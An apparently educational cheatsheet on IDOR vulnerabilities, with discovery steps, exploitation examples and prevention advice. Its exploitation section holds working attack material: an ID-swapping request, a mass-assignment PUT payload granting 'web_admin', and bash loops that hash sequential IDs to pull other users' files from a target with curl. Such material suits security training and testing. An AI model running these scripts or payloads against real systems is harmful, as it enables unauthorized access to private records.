# IDOR Cheatsheet

## Introduction
Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources in the system directly, for example database records or files.

---

## Discovery

### Indicators
-   **Direct References**: URL parameters or request bodies containing IDs, filenames, or other direct references (e.g., `id=123`, `user_id=10`, `file=report.pdf`).
-   **Predictable IDs**: Sequential numbers or easily guessable patterns.
-   **Decodable IDs**: Base64 or hashed values that can be reversed or predicted.

### Testing Methodology
1.  **Identify References**: Look for parameters referencing objects (e.g., `/profile?id=1`).
2.  **Change the ID**: Attempt to access an object belonging to another user (e.g., change `id=1` to `id=2`).
3.  **Check Permissions**: If you can access the object, check if you are authorized to do so.

---

## Exploitation

### Basic IDOR
Simply changing the ID in a GET or POST request.
```http
GET /download.php?file_id=124 HTTP/1.1
```

### IDOR in APIs
APIs often expose internal object references (UUIDs, numeric IDs).
1.  **Information Disclosure**: Detect roles or UUIDs by fuzzing GET requests.
2.  **Mass Assignment**: Attempt to update fields that shouldn't be editable (e.g., `role: admin`).

**Example PUT Request:**
```json
PUT /profile/api.php/profile/2
{
    "uid": "2",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "hacker",
    "email": "hacker@evil.com"
}
```

### Bypassing Encoded References
If IDs are encoded (e.g., Base64, MD5), try to reverse the encoding or generate a list of valid hashes.

**Example (Bash Script for MD5 Hashed IDs):**
If the app expects `contract=<md5_of_id>`:
```bash
#!/bin/bash
for i in {1..10}; do
    # Generate MD5 of the number (assuming simple hashing)
    hash=$(echo -n $i | md5sum | awk '{print $1}')
    curl -sOJ -X POST -d "contract=$hash" http://TARGET_IP/download.php
done
```

**Example (Base64 + MD5):**
```bash
#!/bin/bash
for i in {1..10}; do
    # Encode number to Base64, then MD5
    hash=$(echo -n $i | base64 -w 0 | md5sum | awk '{print $1}')
    curl -sOJ -X POST -d "contract=$hash" http://TARGET_IP/download.php
done
```

---

## Prevention

1.  **Access Control Checks**: Implement robust access control checks for every object reference. Ensure the user is authorized to access the requested object.
2.  **Indirect References**: Use indirect references (e.g., session-based maps) instead of direct database keys.
3.  **Unpredictable IDs**: Use UUIDs or other random identifiers instead of sequential numbers (though this is defense-in-depth, not a fix for access control).
4.  **Validate Input**: Ensure input strictly matches expected formats.
